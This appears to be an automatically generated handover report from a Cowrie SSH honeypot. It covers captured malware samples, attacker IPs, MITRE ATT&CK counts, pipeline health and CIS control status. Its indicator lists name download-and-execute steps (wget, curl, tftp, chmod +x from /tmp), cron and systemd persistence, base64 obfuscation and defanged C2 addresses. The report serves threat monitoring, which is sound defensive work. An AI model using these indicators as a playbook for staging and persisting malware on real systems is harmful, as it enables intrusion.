| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `123.6.229[.]172` | CN | China Unicom Henan province network | **100** ⚠️ | 15 |
| `147.50.231[.]135` | TH | CS Loxinfo Public Company Limited | **100** ⚠️ | 50 |
| `156.236.66[.]15` | HK | Yisu Cloud Ltd | **100** ⚠️ | 17 |
| `92.118.39[.]71` | RO | DMZHOST | **100** ⚠️ | 50 |
| `138.226.239[.]234` | NL | Vlad Cojuhari | **100** ⚠️ | 50 |
| `14.22.23[.]243` | CN | CHINANET Guangdong province network | **100** ⚠️ | 16 |
| `222.103.201[.]40` | KR | Korea Telecom | **100** ⚠️ | 23 |
| `130.12.180[.]174` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `163.125.145[.]5` | CN | China Unicom Guangdong province network | **100** ⚠️ | 3 |
| `134.209.120[.]216` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 253 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 219 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 79 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 72 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 10 |

---

## 🔕 False Positive Summary (61 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 23 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 10 below threshold 25 | 2 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 12 below threshold 25 | 2 |
| AbuseIPDB score 13 below threshold 25 | 2 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 2 |
| AbuseIPDB score 22 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 405 cases |
| Tool 34  | Credential Extractor        | ✅ 4134 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 33 fingerprints |
| Tool 36  | Command Clustering          | ✅ 20 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 242 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 61 filtered (15.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 104 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 34 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 210 priority case(s) shown individually · 118 recon entry/entries in table (13 group(s) consolidating 29 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-23T16:07:30Z_
